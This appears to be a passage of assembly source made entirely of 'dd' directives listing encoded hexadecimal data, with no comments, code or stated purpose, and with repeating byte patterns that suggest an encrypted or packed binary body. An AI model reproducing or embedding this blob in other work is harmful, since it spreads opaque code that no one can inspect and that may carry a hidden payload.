		dd 1328E274h, 388110EEh, 85FD6Ah, 0BD68EF97h, 85ED009Eh
		dd 0FFEF9700h, 3E5EB02Ah, 0CF95FF85h, 64FFFC55h, 0FD00EF5Ch
		dd 669950EFh, 0EFFD25h,	0C5EC6CFDh, 0B8AB55BCh,	18CBB18Dh
		dd 0FDC87415h, 0CBB18DEFh, 24AB3A10h, 0FD00EFADh, 2777E8EFh
		dd 4C62FD00h, 0B9C6FBD9h, 7FC50CBh, 0EF357Ch, 0FCF30B95h
		dd 0CBB18DFFh, 24AB3B14h, 64E8EDA9h, 62FD0027h,	8DFFD944h
		dd 0AD14CBB1h, 0EF358B07h, 0DD379500h, 0B18DFFFCh, 2B9518CBh
		dd 51FFFCDDh, 0FCDD5395h, 328968FFh, 5487ED01h,	9510EE20h
		dd 0FFFCDDD7h, 1337568h, 217C87EDh, 64AC10EEh, 248B74CCh
		dd 5288791h, 0BC1510EEh, 8DEFFDC8h, 0AF6CCBA9h,	10197307h
		dd 82B7EFFh, 0D94462ADh, 33896887h, 0C6BFED01h,	0FD80CB79h
		dd 7FE00EFh, 0EF3540h, 9D24A370h, 0AB3B51BFh, 0E8EB8124h
		dd 0FD0027D7h, 0B7D95462h, 4429AF50h, 150597D9h, 0EFFDC8F5h
		dd 24AB7050h, 0B9C6BFA9h, 7FB74CBh, 0EF350Ah, 0B524A370h
		dd 0AB3B51BFh, 0E8E88D24h, 0FD002807h, 0AFD95462h, 4429AF50h
		dd 150883D9h, 0EFFDC705h, 60CBB9C6h, 0B98DBFF4h, 7AD3CCBh
		dd 0EF3ADAh, 0CD24A370h, 0AB3B51BFh, 0E8E59924h, 0FD002839h
		dd 0C7D95462h, 4429AF50h, 150B8FD9h, 0EFFDC755h, 24AB7050h
		dd 0AD0C5CD9h, 0B3D95C67h, 2854E8h, 0B18DBFFDh,	0AB3B1CCBh
		dd 0E8E2A924h, 0FD002875h, 0F3D94C62h, 50CBA188h, 0FDC7BE15h
		dd 0CBB18DEFh, 24AB3B20h, 0BEE8E4ADh, 62FD0028h, 0C6CBD94Ch
		dd 0F750CBB9h, 0EF3A3507h, 24A37000h, 0D94429D5h, 0C81509BFh
		dd 8DEFFDC7h, 3B2CCBB1h, 0E7AD24ABh, 28E4E8h, 0D94C62FDh
		dd 0CBB9C6DFh, 0B07FA50h, 7000EF3Ah, 29C924A3h,	6BFD944h
		dd 0FDC61215h, 0CBB18DEFh, 24AB3B38h, 12E8EAADh, 62FD0029h
		dd 0C6D3D94Ch, 0F950CBB9h, 0EF3BE107h, 24A37000h, 0D94429BDh
		dd 3C1503BFh, 8DEFFDC6h, 3B44CBB1h, 0EDAD24ABh,	2938E8h
		dd 6D3D64FDh, 64ED018Bh, 18B651Dh, 12D64EDh, 6CED018Eh
		dd 137B53Dh, 0CC74EEEDh, 37C10D64h, 68BEED01h, 0ED0137E1h
		dd 101A0307h, 8B1F76FFh, 7E20CBB9h, 0BF76082Bh,	52EF97F8h
		dd 2AFFB9ADh, 4E2EFFB9h, 10EE2544h, 16D510ADh, 10FD6A29h
		dd 18F1915h, 6D907FEDh,	7F6D907Fh, 907F6D90h, 0BD681097h
		dd 8BED01BAh, 0EFFDA1h,	7464BFFDh, 0EFFD00CAh, 4464AC00h
		dd 0AA56FBD9h, 0CBB18DBFh, 0C6751520h, 0FA6AEFFDh, 0A3700085h
		dd 4428D924h, 0FD00F3D9h, 901500EFh, 68EFFDC6h,	0ED0135F5h
		dd 0CFD94C62h, 2996E8h,	0D94C62FDh, 62AC50E7h, 0E8CBD94Ch
		dd 0FD0029ABh, 1C19B9BFh, 4429ED01h, 1501F7D9h,	0EFFDC6C7h
		dd 8CBB18Dh, 0E924AB3Bh, 2A0DE8EFh, 887FD00h, 7010EE27h
		dd 7DD24A3h, 0EF3B30h, 700085ADh, 7D924A3h, 0EF3B2Ah, 0E124BB70h
		dd 0EE052856h, 0F107AF10h, 5C00EF38h, 0FFFCF30Bh, 8CFA0250h
		dd 7E10EE99h, 0B988FF17h, 0F30BF08Bh, 251FFFCh,	0EE99A8FAh
		dd 742F7810h, 0B5BFE096h, 0E3AD8BE5h, 7C623C8Bh, 0CF8BE7D9h
		dd 1CFFE92Eh, 832776A5h, 59F3EC1Ch, 0E7D94C64h,	7CFA0251h
		dd 7610EE99h, 10348317h, 0AE1D3D33h, 42B3E0Ah, 1876D164h
		dd 137E1BFh, 0FFE92EEDh, 2576A51Ch, 3D64DCEBh, 0ED011C19h
		dd 0DC02C96Ch, 0F7410FC0h, 76F9C42Ch, 500A8B2Eh, 10EE251Ch
		dd 0E02063Ch, 6C358B4Ah, 0A41CFEE1h, 0D5249B76h, 0CFD94C64h
		dd 24CBA98Bh, 9C98D276h, 197810EEh, 0D8D3F089h,	0E889FFFCh
		dd 0FFFCD8AFh, 0D8A7F8C7h, 2FFFFFCh, 0EA3AFF10h, 10EE1328h
		dd 0FD00EFFDh
		dd 0EF972991h, 85FD6Ah,	0FD88AF95h, 85FD6AFFh, 8B380200h
		dd 0FCEEC7F0h, 62F989FFh, 10EE1718h, 74CED4BCh,	0EE1328E2h
		dd 0A1388110h, 0ED0137BDh, 0FE89C06Ah, 85FD6Ah,	0BD68EF97h
		dd 85ED009Eh, 0FFEF9700h, 0D94C622Ah, 0CBB9C7F3h, 0FF100214h
		dd 39B00702h, 0A37600EFh, 5EB0F124h, 0FD0D6699h, 6CFD00EFh
		dd 902CEDC4h, 6D907F6Dh, 7F6D907Fh, 0C887026Ah,	9910EEA8h
		dd 0EFFD004Eh, 898BAD00h, 0FD00EFD8h, 0D31183EFh, 57B9A853h
		dd 0E524A370h, 0EF396B07h, 24A37000h, 0D94428E9h, 0EFFD00BBh
		dd 0C4B51500h, 0B18DEFFDh, 0AB3B10CBh, 0E8EEA924h, 0FD002BB1h
		dd 0EE0EE487h, 24A37010h, 0D94429E5h, 861502B7h, 8DEFFDC4h
		dd 7014CBB9h, 0BFED24A3h, 2BA6E8h, 20D887FDh, 0E39510EEh
		dd 8DFFFCDEh, 9518CBB1h, 0FFFCDD2Bh, 24BB7051h,	230087DDh
		dd 62AF10EEh, 68C7D944h, 0ED013209h, 321D68BFh,	7C87ED01h
		dd 0AC10EE21h, 8B74CC64h, 28878924h, 1510EE05h,	0EFFDC4F1h
		dd 74CBB18Dh, 1D3E07ACh, 2B7EFF10h, 5462AD08h, 89689FD9h
		dd 0BDED0133h, 88CB79C6h, 0FE00EFFDh, 0EF390B07h, 4462AD00h
		dd 3B5083D9h, 0EF79246Bh, 0E8EBFD00h, 0FD002C0Fh, 8FD94C62h
		dd 8429AC50h, 0FD006FD9h, 301505EFh, 8DEFFDC3h,	0AD58CBA9h
		dd 0CBB9C6BDh, 0C907FB7Ch, 0AD00EF3Eh, 0BBD94462h, 24AB3B50h
		dd 42E8E885h, 62FD002Ch, 50A7D94Ch, 8D24AB3Bh, 461551E7h
		dd 8DEFFDC3h, 0AD40CBA9h, 0CBB9C6BDh, 9F07F470h, 0AD00EF3Eh
		dd 0D3D94462h, 24AB3B50h, 74E8E591h, 62FD002Ch,	50DFD94Ch
		dd 0D94429ACh, 90150B87h, 8DEFFDC3h, 0AD28CBA9h, 0CBB9C6BDh
		dd 6F07F164h, 0AD00EF3Eh, 0CBD94462h, 88BFF0B3h, 1560CBA1h
		dd 0EFFDC3B1h, 24A37050h, 0D94429E1h, 0D2150EB7h, 8DEFFDC3h
		dd 751CCBB1h, 7A924B3h,	0EF3E06h, 0DD24A370h, 0BBD94429h
		dd 0C217150Ch, 0B18DEFFDh, 0AB3B24CBh, 0E8E4A924h, 0FD002D17h
		dd 0C7D94C62h, 54CBB9C6h, 3FDC07F7h, 0A37000EFh, 4429D124h
		dd 1509BBD9h, 0EFFDC221h, 30CBB18Dh, 0A924AB3Bh, 2D3DE8E7h
		dd 4C62FD00h, 0B9C6DBD9h, 7FA54CBh, 0EF3FB2h, 0C524A370h
		dd 0BBD94429h, 0C24B1506h, 0B18DEFFDh, 0AB3B3CCBh, 0E8EAA924h
		dd 0FD002D6Bh, 0AFD94C62h, 54CBB9C6h, 3F8807F9h, 0A37000EFh
		dd 4429B924h, 1503BBD9h, 0EFFDC295h, 48CBB18Dh,	0A924AB3Bh
		dd 2D91E8EDh, 3D64FD00h, 0ED018B6Dh, 8B651D64h,	2D64ED01h
		dd 0ED018E01h, 37B53D6Ch, 74EEED01h, 0C10D64CCh, 0BEED0137h
		dd 137E168h, 1FAA07EDh,	1F76FF10h, 20CBB98Bh, 76082B7Eh
		dd 0EF97F8BFh, 0FFB9AD52h, 2EFFB92Ah, 0EE25444Eh, 0D510AD10h
		dd 0FD6A2916h, 8F191510h, 907FED01h, 0D681097h,	8BED01BAh
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 4464AC00h, 0AA56FBD9h
		dd 0CBB18DBFh, 0C2A51520h, 0FA6AEFFDh, 0A3700085h, 4428D924h
		dd 0FD00F3D9h, 0C01500EFh, 68EFFDC2h, 0ED0135F5h, 0CFD94C62h
		dd 2DE6E8h, 0D94C62FDh,	62AC50E7h, 0E8CBD94Ch, 0FD002DFBh
		dd 1C19B9BFh, 4429ED01h, 1501F7D9h, 0EFFDC137h,	8CBB18Dh
		dd 0E924AB3Bh, 2E5DE8EFh, 887FD00h, 7010EE27h, 7DD24A3h
		dd 0EF3CE0h, 700085ADh,	7D924A3h, 0EF3CDAh, 0E124BB70h
		dd 0EE052856h, 0A107AF10h, 5C00EF3Ch, 0FFFCF30Bh, 8CFA0250h
		dd 7E10EE99h, 0B988FF17h, 0F30BF08Bh, 251FFFCh,	0EE99A8FAh
		dd 742F7810h, 0B5BFE096h, 0E3AD8BE5h, 7C623C8Bh, 0CF8BE7D9h
		dd 1CFFE92Eh, 832776A5h, 59F3EC1Ch, 0E7D94C64h,	7CFA0251h
		dd 7610EE99h, 10348317h, 0AE1D3D33h, 42B3E0Ah, 1876D164h
		dd 137E1BFh, 0FFE92EEDh, 2576A51Ch, 3D64DCEBh, 0ED011C19h
		dd 0DC02C96Ch, 0F7410FC0h, 76F9C42Ch, 500A8B2Eh, 10EE251Ch
		dd 0E02063Ch, 6C358B4Ah, 0A41CFEE1h, 0D5249B76h, 0CFD94C64h
		dd 24CBA98Bh, 9C98D276h, 197810EEh, 0D8D3F089h,	0E889FFFCh
		dd 0FFFCD8AFh, 0D8A7F8C7h, 2FFFFFCh, 0EA3AFF10h, 10EE1328h
		dd 0FD00EFFDh, 0EF972991h, 85FD6Ah, 0FD8C9F95h,	85FD6AFFh
		dd 8B380200h, 0FCEEC7F0h, 62F989FFh, 10EE1718h,	74CED4BCh
		dd 0EE1328E2h, 0A1388110h, 0ED0137BDh, 0FE89C06Ah, 85FD6Ah
		dd 0BD68EF97h, 85ED009Eh, 0FFEF9700h, 0D94C622Ah, 0CBB9C7F3h
		dd 0FF100214h, 3D600702h, 0A37600EFh, 5EB0F124h, 0FD0D6699h
		dd 6CFD00EFh, 902CEDC4h, 6D907F6Dh, 7F6D907Fh, 5887026Ah
		dd 9910EEABh, 0EFFD004Eh, 898BAD00h, 0FD00EFD8h, 0C31183EFh
		dd 8DB8AB53h, 1514CBB1h, 0EFFDC0F3h, 0CCBB18Dh,	0BD24AB3Ah
		dd 0EFFD00EFh, 2FF6E8h,	0D94C62FDh, 0CBB9C6FFh,	0FD07FC40h
		dd 9500EF42h, 0FFFCF30Bh, 10CBB18Dh, 0B924AB3Bh, 2FE7E8EDh
		dd 4462FD00h, 0B18DE3D9h, 7AD10CBh, 0EF3D0Ch, 0FCDD3795h
		dd 323968FFh, 4C62ED01h, 0F168F7D9h, 0BEED0131h, 131D568h
		dd 217C87EDh, 64AC10EEh, 248B74CCh, 52887ADh, 0C1510EEh
		dd 8DEFFDBFh, 0AF50CBA9h, 10210307h, 82B7EFFh, 0D94462ADh
		dd 338968A3h, 0C6BFED01h, 0FE64CBB9h, 0EF42D307h, 24A37000h
		dd 3B51BFB9h, 0EB9D24ABh, 5040E8h, 0D95462FDh, 29AF50D3h
		dd 5B3D944h, 0FDBF4215h, 0AB7050EFh, 0C6BFC524h, 0FB58CBB9h
		dd 0EF429707h, 24A37000h, 3B51BFD1h, 0E8A924ABh, 5070E8h
		dd 0D95462FDh, 29AF50CBh, 8BFD944h, 0FDBF9215h,	0E64E50EFh
		dd 20CBB98Dh, 0B524B375h, 5091E8BFh, 8DBFFD00h,	3B18CBB1h
		dd 0E5B924ABh, 50B6E8h,	0D94C62FDh, 0CBA188F7h,	0BFFB1540h
		dd 0B18DEFFDh, 0AB3B1CCBh, 0E8E7BD24h, 0FD0050FBh, 0CFD94C62h
		dd 40CBB9C6h, 43F807FAh, 0A37000EFh, 4429D924h,	1506AFD9h
		dd 0EFFDBE05h, 28CBB18Dh, 0BD24AB3Bh, 5121E8EAh, 4C62FD00h
		dd 0B9C6C3D9h, 7F940CBh, 0EF43CEh, 0CD24A370h, 0AFD94429h
		dd 0BE2F1503h, 0B18DEFFDh, 0AB3B34CBh, 0E8EDBD24h, 0FD00514Fh
		dd 8B6D3D64h, 1D64ED01h, 0ED018B65h, 37B53D6Ch,	74EEED01h
		dd 0C10D64D4h, 0BEED0137h, 137E168h, 23F607EDh,	1F76FF10h
		dd 1CCBB98Bh, 76082B7Eh, 0EF97F8BFh, 0FFB9AD52h, 2EFFB92Ah
		dd 0EF97CE04h, 600BE8FFh, 6D90FFFCh, 7F6D907Fh,	8087026Ah
		dd 9910EEABh, 0EFFD004Eh, 898BAD00h, 0FD00EFD8h, 0AB7651EFh
		dd 57B9E924h, 0D94C62ADh, 5167E8CFh, 785FD00h, 0B18DEF97h
		dd 0AB3A24CBh, 0EFE124h, 82E8EFFDh, 87FD0051h, 10EE2708h
		dd 0DD24A370h, 0EF436B07h, 24A37000h, 7051BFF5h, 7D924A3h
		dd 0EF4356h, 0EE456ADh,	0AB3B10EEh, 0E8EEE524h,	0FD0051D5h
		dd 0E7D94C62h, 14CBB9C6h, 40F007FDh, 0E79500EFh, 8DFFFCDAh
		dd 1520CBB1h, 0EFFDBEDFh, 8DEF9750h, 1524CBB1h,	0EFFDBEC5h
		dd 1CCBA98Dh, 0FCF8C744h, 1E1552FFh, 0A1EFFDBDh, 0ED011C19h
		dd 63E8FFBFh, 83FFFC64h, 0AB751005h, 1C190D64h,	0FFBEED01h
		dd 0FC6447E8h, 9B3D85FFh, 4850F26Bh, 0F15064F7h, 9370C164h
		dd 3264F524h, 0E02063Ch, 6C358B4Ah, 0A41CFEE1h,	0F524A376h
		dd 93E8FFBEh, 8BFFFC64h, 2C96C05h, 410FC0DCh, 0F9C42CF7h
		dd 0A8B3E76h, 0EE251C50h, 2063C10h, 378B4A0Eh, 0D2762104h
		dd 10EE0EE4h, 0CEFF267Eh, 1853F22Fh, 8B16D6D1h,	42F7643Ch
		dd 0FFFCD8F3h, 0F3ED14C1h, 7EC86458h, 4B0E030Eh, 28CB898Bh
		dd 0DD24A376h, 0CBD95464h, 6177C08Bh, 0B85FFFCh, 37C10D66h
		dd 1566ED01h, 0ED0137BDh, 37B50528h, 0FF10ED01h, 0F8C71002h
		dd 0FFFCEEC7h, 0EFFD00h
		dd 0FD6AC683h, 0EF970085h, 7F3D68h, 970085EDh, 642AFFEFh
		dd 101D50Dh, 700466EDh,	0FFFCEAF7h, 8921C641h, 0FCEEC7F0h
		dd 4E2A7CFFh, 10EE2540h, 0EC742F78h, 0EF970085h, 4087FD6Ah
		dd 9710EF8Ch, 10FD6AEFh, 24A370D7h, 0D94428E1h,	1002FFFBh
		dd 0BC5F15FFh, 0B18BEFFDh, 0B1A20CCBh, 0E27464h, 7E00EFFDh
		dd 7F3E102Bh, 907F6D90h, 6D907F6Dh, 3795FF85h, 64FFFC56h
		dd 0FD00EF5Ch, 669950EFh, 0EFFD25h, 0D9EC6CFDh,	0B8AB55BCh
		dd 18CBB18Dh, 0FDBC8415h, 0CBB18DEFh, 24AB3A10h, 0FD00EFC1h
		dd 53A7E8EFh, 4C62FD00h, 0B9C6FBD9h, 7FC3CCBh, 0EF414Ch
		dd 0FCF30B95h, 0CBB18DFFh, 24AB3B14h, 94E8EDBDh, 62FD0053h
		dd 8DFFD944h, 0AD14CBB1h, 0EF415B07h, 24A37000h, 20D887E9h
		dd 87AC10EEh, 10EE2300h, 0FCDEDF95h, 237651FFh,	44CB9989h
		dd 0FCF8C795h, 53C1E8FFh, 5462FD00h, 1552ABD9h,	1002D8B3h
		dd 50E73983h, 0BD24AB70h, 0EE217487h, 4429AD10h, 1503B7D9h
		dd 0EFFDBCC3h, 38CBB18Dh, 0B9C6BEADh, 7F954CBh,	0EF4116h
		dd 0CD24BB70h, 0AB3B52BFh, 0E8EAAD24h, 0FD0053FBh, 0CBB98DBFh
		dd 4429AD2Ch, 1506A3D9h, 0EFFDBB1Fh, 20CBB18Dh,	0AC50E84Eh
		dd 0A7D95C67h, 5418E8h,	0B18DBFFDh, 0AB3B1CCBh,	0E8E7BD24h
		dd 0FD005439h, 0F3D94C62h, 3CCBA188h, 0FDBB6215h, 0CBB18DEFh
		dd 24AB3B20h, 82E8E9C1h, 29FD0054h, 5D3D944h, 0D924A370h
		dd 0EF467107h, 24A37000h, 0D94429D5h, 8C1504D3h, 8DEFFDBBh
		dd 3B2CCBB1h, 0ECC124ABh, 54A8E8h, 0D94C62FDh, 0CBB9C6DFh
		dd 4707FF3Ch, 7600EF46h, 0EE9990D2h, 98F27610h,	7610EE99h
		dd 0EE9CFCC2h, 48D27E10h, 0FC10EE25h, 0FA76329Bh, 10EE253Ch
		dd 251C87AFh, 6A1510EEh, 8B1002DBh, 0D944640Dh,	0E73983CFh
		dd 6A17B58Bh, 0AB50BEFDh, 10ABD710h, 44FA76D3h,	0AF10EE25h
		dd 2A16D510h, 1510FD6Ah, 0ED018F19h, 7F6D907Fh,	907F6D90h
		dd 6D907F6Dh, 0EF95FF85h, 64FFFC57h, 0FD00EF5Ch, 669950EFh
		dd 0EFFD25h, 0B98BBEFDh, 0B8AB14CBh, 24A37050h,	461A07DDh
		dd 0E89700EFh, 4C62FD6Ah, 0B9C7CBD9h, 0EFFD1CCBh, 0FF07FD00h
		dd 9500EF47h, 0FFFCDAE7h, 20CBB18Dh, 0FDBA0415h, 0CBB18DEFh
		dd 8DBEAD08h, 1524CBB1h, 0EFFDBA39h, 0F30B4450h, 0B9C6FFFCh
		dd 7FC18CBh, 0EF47A8h, 0F524A370h, 0FBD94429h, 0BA9F1500h
		dd 0F568EFFDh, 62ED0135h, 0E8CFD94Ch, 0FD00554Dh, 62FD6ABFh
		dd 0E8CBD94Ch, 0FD005557h, 0F3D95462h, 117D5B9h, 8CE8BDEDh
		dd 4EFD0055h, 10EE0EE4h, 711510ADh, 6CED018Bh, 569A02F8h
		dd 0EE4E276h, 10AC10EEh, 18B5515h, 89C06AEDh, 0A7420F84h
		dd 0CBF760Ah, 818D2E76h, 0DD7608CBh, 0F3ED14C1h, 7EC86458h
		dd 4B0E030Eh, 8CBB18Bh,	811510ACh, 64ED018Bh, 0FF267EF8h
		dd 53F22FCEh, 16D6D118h, 0F7642C8Bh, 0FCD8F342h, 0ED14C1FFh
		dd 0CA6458F3h, 0C08BCE16h, 0FFFCF30Bh, 33103483h, 0AAE1D3Dh
		dd 64042B3Eh, 0BF1876C1h, 0ED0137E1h, 1CFFE92Eh, 832776A5h
		dd 59F3EC1Ch, 0C7D97464h, 20CBB18Bh, 0D924BB76h, 8E653D64h
		dd 0F66AED01h, 253CE274h, 0FA7410EEh, 10EE2540h, 2548EA3Ah
		dd 100210EEh, 52802FFh,	0ED0101D5h, 0EFFD00EFh,	85D47Eh
		dd 0FD6AEF97h, 0EF697087h, 6AEF9710h, 76D710FDh, 0EE1328E2h
		dd 8DEB7410h, 0ED0105E5h, 66333BAEh, 101D50Dh, 5CD793EDh
		dd 0FFFCD8AFh, 119B3D85h, 0FD6AEF97h, 0AF950085h, 6AFFFD71h
		dd 20085FDh, 0CBB18D38h, 24AB3A1Ch, 2FF10E9h, 56CDE810h
		dd 4C64FD00h, 0A35FE3D9h, 0EFF0898Bh, 83EFFD00h, 6DC3FF39h
		dd 7F6D907Fh, 907F6D90h, 48681097h, 8BED01B8h, 0EFFDA1h
		dd 7464BFFDh, 0EFFD00CAh, 40037C00h, 0AE00EFFCh, 62AA56BAh
		dd 0E8F3D94Ch, 0FD005715h, 0FBD94C62h, 58CB79C7h, 0FD00EFFCh
		dd 7FD00EFh, 0EF45D4h, 0E524A370h, 0B7D98429h, 1EFFD01h
		dd 0FDB82C15h, 1C1968EFh, 4C62ED01h, 79C6F7D9h,	0EFFC5CCBh
		dd 0DD07FF00h, 7000EF45h, 62E924ABh, 50F7D94Ch,	0FDB82015h
		dd 0D7D08BEFh, 0B3FFFCFCh, 0D94C62F0h, 5773E8FFh, 4C4EFD00h
		dd 3B10EE25h, 0EEA5246Bh, 3BECFD00h, 0CE029115h, 0C7F08B02h
		dd 45FFFCF8h, 0D95462A8h, 7AF51FBh, 0EF4580h, 0E1249376h
		dd 0DC02C96Ch, 0C2B7EC0h, 2CF7410Fh, 0BB70F9C4h, 0C164AD24h
		dd 78B1876h, 0EE20D887h, 2063C10h, 358B4A0Eh, 0EE233C87h
		dd 30E7E10h, 0A524BB70h, 0A370A41Ch, 68BEDD24h,	0ED013241h
		dd 0EE207487h, 0DDBB9510h, 0C568FFFCh, 87ED0132h, 10EE2188h
		dd 0FCDC9395h, 237651FFh, 74CB9989h, 456207AFh,	0AB7000EFh
		dd 0E8BF9524h, 2FF3BA5h, 0BFF5C46Ch, 60CBB18Dh,	0FCDC9B95h
		dd 6B3B51FFh, 0EE7524h,	0D8E8EBFDh, 62FD0057h, 50BBD954h
		dd 0D98429AFh, 0EFFD016Bh, 0B8E31505h, 7050EFFDh, 0BFB124ABh
		dd 80CB79C6h, 0FB00EFFCh, 0EF4AF907h, 24A37000h, 3B51BFBDh
		dd 0EE81246Bh, 0E8E8FD00h, 0FD00581Bh, 0B3D95462h, 8429AF50h
		dd 0FD0197D9h, 3C1508EFh, 50EFFDB7h, 0C524AB70h, 0CB79C6BFh
		dd 0EFFC74h, 4AC007F4h,	0A37000EFh, 51BFA524h, 8D246B3Bh
		dd 0E5FD00EEh, 5850E8h,	0D95462FDh, 29AF50D7h, 183D984h
		dd 150BEFFDh, 0EFFDB77Bh, 24AB7050h, 79C6BFB5h,	0EFFC68CBh
		dd 8707F100h, 7000EF4Ah, 0BFC524A3h, 24737551h,	0FD00EE99h
		dd 0EF4A7507h, 4C62AD00h, 79C6CFD9h, 0EFFC5CCBh, 5107F300h
		dd 7000EF4Ah, 67C924A3h, 1B7D99Ch, 0EAE8EFFDh, 62FD0058h
		dd 0C6D3D94Ch, 0FC58CB79h, 7F100EFh, 0EF4A06h, 0D124A370h
		dd 0B7D98429h, 0BEFFD01h, 0FDB61A15h, 0CBB18DEFh, 246B3B48h
		dd 0FD00EEA5h, 5919E8E5h, 4C62FD00h, 79C6CFD9h,	0EFFC58CBh
		dd 0D307F400h, 7000EF4Bh, 29B924A3h, 1B7D984h, 1508EFFDh
		dd 0EFFDB62Dh, 24CBB18Dh, 0A5246B3Bh, 0E8FD00EEh, 594CE8h
		dd 0D94C62FDh, 0CB79C6C7h, 0EFFC58h, 4BA007FBh,	0A37000EFh
		dd 8429CD24h, 0FD01B7D9h, 601505EFh, 8DEFFDB6h,	3B38CBB1h
		dd 0EEA5246Bh, 0E8EBFD00h, 0FD005983h, 0AFD94C62h, 58CB79C6h
		dd 0FE00EFFCh, 0EF4B6D07h, 0AF4400h, 3D33EFFDh,	0BFD97C62h
		dd 3D6C56F3h, 0ED0137B5h, 64AC74EEh, 137C115h, 0E168BDEDh
		dd 7ED0137h, 0FF102BB0h, 0B98B1F76h, 2B7E24CBh,	0F8A77608h
		dd 0AD51EF97h, 7FE8FFB9h, 56FFFC64h, 9998FA02h,	0AB5C10EEh
		dd 50FFFCD8h, 9CFCFA02h, 0A37010EEh, 8429ED24h,	0FD01B7D9h
		dd 0E41502EFh, 0E9EFFDB6h, 2FF1294h, 0FA020085h, 10EE9DE4h
		dd 6D907F6Dh, 7F6D907Fh, 0D087026Ah, 9910EEAAh,	0EFFD004Eh
		dd 898BAD00h, 0FD00EFD8h, 0AB7651EFh, 57B9E924h, 0D94C62ADh
		dd 59D7E8CFh, 785FD00h,	0B18DEF97h, 0AB3A24CBh,	0EFE124h
		dd 0F2E8EFFDh, 87FD0059h, 10EE2708h, 0DD24A370h, 0EF48FB07h
		dd 24A37000h, 7051BFF5h, 7D924A3h, 0EF48E6h, 0EE456ADh
		dd 0AB3B10EEh, 0E8EEE524h, 0FD005A45h, 0E7D94C62h, 14CBB9C6h
		dd 488007FDh, 0E79500EFh, 8DFFFCDAh, 1520CBB1h,	0EFFDB52Fh
		dd 8DEF9750h, 1524CBB1h, 0EFFDB555h, 1CCBA98Dh,	0FCF8C744h
		dd 6E1552FFh, 8BEFFDB5h, 0FCF30BE8h, 0CBB98BFFh, 24A3762Ch
		dd 0C5A3BDCDh, 66ED0113h, 137B10Dh, 711510EDh, 6CED018Bh
		dd 559A02F8h, 0FCF30B5Ch, 0FA0250FFh, 10EE99A8h, 96742F78h
		dd 0E5B5BFE0h, 8BE3AD8Bh, 0D97C623Ch, 2ECF8BC3h, 0A51CFFE9h
		dd 1C832776h, 6459F3ECh
		dd 51C3D94Ch, 997CFA02h, 177610EEh, 33103483h, 0AAE1D3Dh
		dd 64042B3Eh, 0BF1876D1h, 0ED0137E1h, 1CFFE92Eh, 0EB2576A5h
		dd 193D64DCh, 6CED011Ch, 0C0DC02C9h, 2CF7410Fh,	2E76F9C4h
		dd 1C500A8Bh, 3C10EE25h, 4A0E0206h, 0E16C358Bh,	76A41CFEh
		dd 64D5249Bh, 8BCFD94Ch, 7624CBA9h, 0EE9C98D2h,	89197810h
		dd 0FCD8D3F0h, 0AFE889FFh, 0C7FFFCD8h, 0FCD8A7F8h, 1002FFFFh
		dd 28EA3AFFh, 0FD10EE13h, 91FD00EFh, 6AEF9729h,	950085FDh
		dd 0FFFD971Fh, 85FD6Ah,	0F08B3802h, 0FFFCEEC7h,	1862F989h
		dd 0BC10EE17h, 0E274CED4h, 10EE1328h, 0BDA13881h, 6AED0137h
		dd 6AFE89C0h, 970085FDh, 9EBD68EFh, 85ED00h, 2AFFEF97h
		dd 0F3D94C62h, 14CBB9C7h, 2FF1002h, 0EF492D07h,	24A37600h
		dd 995EB0F1h, 0EFFD0D66h, 0C46CFD00h, 6D902CEDh, 7F6D907Fh
		dd 4CBB98Bh, 0C8BB8ABh,	0E11FE8BFh, 4464FD00h, 0C08BFFD9h
		dd 0FFFC61ABh, 6283D85h, 0ED018AD9h, 0A170079Bh, 0FFBEAD10h
		dd 0D944642Ah, 9B3D85F7h, 1079700Ah, 0AD00EFFCh, 642AFFBDh
		dd 85F3D944h, 0AD089B3Dh, 0EE014087h, 8B380210h, 7620CBB9h
		dd 4CE924A3h, 10EE2550h, 63586174h, 693A00EFh, 0EF6354h
		dd 0FD00EFFDh, 0EDED8629h, 8BEFFD00h, 3F5EB03Bh, 7F6D00F7h
		dd 907F6D90h, 6D907F6Dh, 70C8BB9h, 0EFFC88h, 0F524AB0Bh
		dd 0B9F474EEh, 5E0CE8h,	0F9C46CFDh, 2DA3C664h, 907FFD04h
		dd 0AB55BCACh, 85FD6AB8h, 4AB11502h, 0D8BEFFDh,	0EFFC2887h
		dd 249B7400h, 4CC207E9h, 2B7E00EFh, 57177604h, 0D50728ABh
		dd 7FD00EEh, 0EFB736h, 8A742F78h, 8E811510h, 0F86CED01h
		dd 766C9BEFh, 64E52483h, 18D6D35h, 0A28DBAEDh, 6C2BFFCBh
		dd 53BFF9C4h, 39833902h, 0FA0250EBh, 10EE9FF8h,	78082B7Eh
		dd 0B0F6762Fh, 157A05Eh, 0A600EFFDh, 0AB76C3B6h, 50B8ED24h
		dd 0FD490C15h, 9B3D85EFh, 0D610A82Ah, 0AD042B7Eh, 6C2BFFBCh
		dd 0FFBFF9C4h, 0FC6217E8h, 0E73983FFh, 0CB983D85h, 0ED24A376h
		dd 561551B8h, 85EFFD49h, 0A2D69A3Dh, 2FCE5DB1h,	902CA45Bh
		dd 6D907F6Dh, 7F6D907Fh, 907F6D90h, 0FC00037Ch,	56AA00EFh
		dd 0EFFD3Fh, 818D2FCEh,	0AB3B05CBh, 68EFF924h, 0FD00EF03h
		dd 6376AB1Ch, 0EEF124h,	0B98D45FDh, 0BEAD08CBh,	639BE8FFh
		dd 0A98DFFFCh, 0AF9504CBh, 52FFFCFDh, 9FF8FA02h, 2B7E10EEh
		dd 5F2F7808h, 0FD00EE45h, 4CF874EFh, 10EDFC40h,	0FC002B7Ch
		dd 0E73F00EFh, 907F6D00h, 0F924AB76h, 0BF0C8BB9h, 0E2DEE8h
		dd 0D90628FDh, 28ED018Ah, 71A986h, 0FD00EFFDh, 0B13B8BEFh
		dd 90EFF9C2h, 6D907F6Dh, 7F6D907Fh, 907F6D90h, 0FD6AEE97h
		dd 0EF970085h, 0B08D68h, 970085EDh, 0D7F7E8EFh,	0C46CFD00h
		dd 6D902CE1h, 7F6D907Fh, 57367653h, 7E8B10CEh, 0EFFD9EBBh
		dd 65CBFEC7h, 3D85FFFCh, 64A82E99h, 18E952Dh, 4E8DB9EDh
		dd 0EFFD02FBh, 0FF85FB8Bh, 76D510ADh, 0FA0251E1h, 10EE9CE0h
		dd 63546C76h, 6CBA00EFh, 0F8D4F9C6h, 0A05E0D8Fh, 0A15CB64h
		dd 5FEFFD0Ch, 6D902CA6h, 0CB898BB9h, 6AEF9708h,	235887FFh
		dd 10AB10EEh, 18B6D15h,	2F86CEDh, 0FA02189Ah, 10EE9978h
